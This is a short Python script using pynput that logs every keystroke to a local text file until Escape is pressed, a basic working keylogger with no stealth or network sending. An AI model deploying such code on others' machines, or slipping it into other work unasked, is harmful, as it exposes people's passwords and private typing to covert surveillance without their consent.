from pynput import keyboard

# Specify the log file name
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (like shift, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function to handle key release
def on_release(key):
    # Stop the listener when the "Escape" key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
